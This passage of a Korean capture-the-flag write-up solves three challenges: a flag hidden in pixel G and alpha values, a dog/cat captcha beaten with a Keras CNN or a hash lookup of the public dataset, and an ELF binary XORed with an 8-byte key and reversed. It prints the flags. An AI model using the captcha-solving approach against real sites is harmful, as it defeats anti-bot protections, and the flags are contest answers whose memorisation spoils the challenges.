- 주어진 이미지에서 A값(투명도)가 0xFF가 아닌 좌표들과 그 좌표에 해당하는 Pixel의 R,G,B,A 값들을 추출하면 아래와 같다.

```
(x,y) => (r,g,b,a)
===============================
(1,416)	=> (13,110,20,170)	=> 'n'
(32,1172)	=> (0,103,0,167)	=> 'g'
(45,967)	=> (15,105,24,163)	=> 'i'
(113,1004)	=> (17,71,28,172)	=> 'G'
(160,1010)	=> (17,66,26,174)	=> 'B'
(161,704)	=> (16,116,25,176)	=> 't'
(192,110)	=> (17,70,35,154)	=> 'F'
(289,983)	=> (17,98,28,152)	=> 'b'
(301,736)	=> (17,95,26,173)	=> '_'
(312,1265)	=> (0,103,0,157)	=> 'g'
(359,887)	=> (17,64,27,156)	=> '@'
(395,600)	=> (202,95,163,161)	=> '_'
(415,45)	=> (18,105,36,175)	=> 'i'
(445,1106)	=> (17,98,33,150)	=> 'b'
(453,256)	=> (202,105,163,169)	=> 'i'
(456,783)	=> (18,105,30,159)	=> 'i'
(480,433)	=> (31,95,57,171)	=> '_'
(533,833)	=> (20,110,34,166)	=> 'n'
(557,90)	=> (25,95,44,168)	=> '_'
(643,1106)	=> (17,111,33,151)	=> 'o'
(668,818)	=> (17,123,27,153)	=> '{'
(674,677)	=> (30,105,34,165)	=> 'i'
(686,55)	=> (18,100,36,164)	=> 'd'
(801,54)	=> (17,108,35,155)	=> 'l'
(917,292)	=> (18,36,35,177)	=> '$'
(968,574)	=> (15,72,25,162)	=> 'H'
(970,1039)	=> (0,125,0,178)	=> '}'
(972,801)	=> (17,95,29,158)	=> '_'
(987,922)	=> (17,115,26,160)	=> 's'
```

- 위 값들에서 중요한 값들은 G에 해당하는 값들과 A에 해당하는 값들이다.
- G는 Flag의 각 문자들을 의미하며, A는 문자들의 Index를 의미한다.
- G 값들을 A의 값에 따라 나열하면 Flag를 추출할 수 있다.
- **Flag : bob{Fl@g_is_Hiding_in_G_Bit$}**


<br />


<br />



## Catcha

---

![/assets/bob/bob996.png](/assets/bob/bob996.png)

약 5만장의 강아지와 고양이 사진이 랜덤으로 나오며, 1초 안에 사진에 나온 동물이 강아지인지 고양이인지 맞춰야 하는 captcha solver 문제입니다. 300개의 스테이지를 모두 클리어하면 플래그를 획득할 수 있다.

출제 의도는 일종의 '`자동 의사 결정기`'를 만들 수 있는가?' 이다.

의도했던 풀이는 사실 `CNN과 GAN을 적절히 섞어 하나의 앙상블 모델을 컴파일하고 주어진 데이터셋으로 학습 후 정답을 예측`하는 것이였으나,  문제의 난이도를 하향 조절 하다 보니(...) 문제에 제공되는 데이터셋을 전부 제공하게 되었고, 그로 인해 따로 모델을 컴파일하지 않고 주어진 데이터셋으로 일종의 hash table을 만들어 문제를 풀이할 수 있다.

### 머신러닝으로 풀기

분류해야 할 데이터가 이미지이기 때문에 `CNN(Convolutional Neural Network) 모델`을 사용한다. 주어진 데이터셋의 이미지 사이즈가 모두 제각각이기 때문에 어느정도의 preprocessing 이 필요하다. 또한 훈련의 연산량을 줄여 훈련 효율을 높이기 위해 이미지를 grayscale로 변환했다.

1. 이미지 전처리 (Preprocessing)

    ```python
    import numpy as np
    import pandas as pd
    import cv2
    import tensorflow as tf
    from tensorflow.keras.models import Sequential
    from tensorflow.keras.layers import Dense, Flatten, Dropout, Activation, Conv2D, MaxPooling2D

    path = './dataset/train'

    X = []
    y = [] # target
    convert = lambda category : int(category == 'dog')

    def preprocess(path):
        for p in os.listdir(path):
            category = p.split(".")[0]
            category = convert(category)
            img_array = cv2.imread(os.path.join(path,p),cv2.IMREAD_GRAYSCALE)
            new_img_array = cv2.resize(img_array, dsize=(80, 80))
            X.append(new_img_array)
            y.append(category)

    # preprocess the data
    preprocess(path)
    X = np.array(X).reshape(-1, 80,80,1)
    y = np.array(y)

    # normalize data
    X = X/255.0
    ```

2. 모델 빌드 및 컴파일

    ```python
    model = Sequential()

    # add a densely-connected layer with 64 units to the model:
    model.add(Conv2D(64,(3,3), activation = 'relu', input_shape = X.shape[1:]))
    model.add(MaxPooling2D(pool_size = (2,2)))

    # add another layer:
    model.add(Conv2D(64,(3,3), activation = 'relu'))
    model.add(MaxPooling2D(pool_size = (2,2)))

    model.add(Flatten())
    model.add(Dense(64, activation='relu'))

    # add a softmax layer with 10 output units:
    model.add(Dense(1, activation='sigmoid'))

    model.compile(optimizer="adam",
                  loss='binary_crossentropy',
                  metrics=['accuracy'])
    ```

3. 모델 학습

    ```python
    model.fit(X, y, epochs=10, batch_size=32, validation_split=0.2)
    ```

4. 이미지 예측

    ```python
    cv2.imread(path, cv2.IMREAD_GRAYSCALE)
    # resize
    cv2.resize(img_array, dsize=(80,80))
    # reshape
    data = np.array(data).reshape(-1,80,80,1)
    # normalize
    data = data/255.0

    # predict
    model.predict(data)
    ```

    이후, 학습한 모델을 이용해 문제 이미지를 실시간으로 받아오고 문제의 정답을 예측한 뒤 정답을 서버로 전송하면 된다.

### hashtable로 풀기

소스코드에 나와있는 kaggle competition에 접속하여 주어진 데이터셋을 모두 다운로드 받은 다음 hash table 을 제작한다. 이후 문제 이미지에 해당하는 hash를 이용하여 문제의 정답을 구한다.


<br />


<br />



## verrox

---

![/assets/bob/bob997.png](/assets/bob/bob997.png)

description을 살펴보면 세상이 뒤집어진 것 같다는 말을 하고 있다.
verrox를 뒤집으면 xorrev이며, xor + rev라는 것을 유추할 수 있다.
해당 바이너리를 reverse한 후 8바이트 xor 키를 구해 연산하면 원본 ELF 파일이 나오게 되며, 실행 시 플래그를 얻을 수 있다.

### 1. xor key

![/assets/bob/bob998.png](/assets/bob/bob998.png)

- 바이너리를 hexdump, hxd 등으로 살펴보면 0x231f33f2aa2d7ed2가 상당히 많이 있는 것을 확인할 수 있다.
- 8바이트 단위로 0x231f...가 반복되고 있기 때문에 8바이트 단위로 xor 연산을 했다고 볼 수 있다. 또한, elf 바이너리의 경우 null byte의 반복이 많기 때문에 xor key는 0x231f33f2aa2d7ed2로 가정할 수 있다.

### 2. 풀이

```python
#coding: utf-8

import struct

data = b''
with open("verrox", "rb") as f:
    data = f.read()

with open("xorrev", "wb") as f:
    key = b"\x23\x1f\x33\xf2\xaa\x2d\x7e\xd2"
    res = b""
    for i in range(0, len(data)):
        res += struct.pack("B", data[i]^key[i%8])

    res = res[::-1]
    f.write(res)
```

![/assets/bob/bob999.png](/assets/bob/bob999.png)

- 해당 xor key를 이용하여 8바이트 단위로 xor연산 후 reverse 해주게 되면 원본 바이너리를 획득할 수 있다.

![/assets/bob/bob9100.png](/assets/bob/bob9100.png)

- 얻어낸 바이너리를 실행하면 플래그를 얻을 수 있다.
- FLAG : bob{royal_macaron_is_very_tasty_you_know?}